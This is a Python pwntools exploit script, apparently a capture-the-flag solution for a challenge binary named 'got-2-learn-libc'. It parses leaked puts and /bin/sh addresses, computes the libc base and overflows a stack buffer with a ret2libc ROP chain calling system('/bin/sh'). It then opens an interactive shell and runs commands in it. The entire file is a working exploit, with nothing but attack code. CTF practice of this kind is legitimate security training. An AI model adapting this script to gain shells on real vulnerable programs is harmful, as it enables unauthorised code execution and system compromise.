#! /usr/bin/env python
from pwn import *
context.clear(arch='i386', os='linux')


class ExploitInfo:
    name    = '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln'
    #
    offset_buf_to_eip = 0x9c + 4
    # Offsets
    libc_entrypoint = 0x000187c0
    offset_puts     = 0x0005f140 - libc_entrypoint
    offset_system   = 0x0003a940 - libc_entrypoint
    offset_exit     = 0x0002e7b0 - libc_entrypoint


def main():
    p = process(ExploitInfo.name)

    p.recvuntil('puts: ')
    leak = p.recvline().strip()
    puts_addr = int(leak, 16)

    p.recvuntil('useful_string: ')
    leak = p.recvline()
    bin_sh_addr = int(leak, 16)

    # Calculate libc base
    libc_base   = puts_addr - ExploitInfo.offset_puts
    system_addr = libc_base + ExploitInfo.offset_system # + 3 # +3 to avoid null byte on address
    exit_addr   = libc_base + ExploitInfo.offset_exit

    log.info("puts is at    : 0x%x" % puts_addr)
    log.info("libc base     : 0x%x" % libc_base)
    log.info("system is at  : 0x%x" % system_addr)
    log.info("exit is at    : 0x%x" % exit_addr)
    log.info("/bin/sh is at : 0x%x" % bin_sh_addr)

    ropchain = p32(system_addr)
    ropchain += p32(exit_addr)
    ropchain += p32(bin_sh_addr)

    payload = 'A' * ExploitInfo.offset_buf_to_eip
    payload += ropchain
    p.clean()
    p.sendline(payload)

    log.success("Here comes the shell!")
    p.clean()
    p.sendline('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/')
    p.sendline('ls -l')
    p.interactive()


if __name__ == "__main__":
    main()
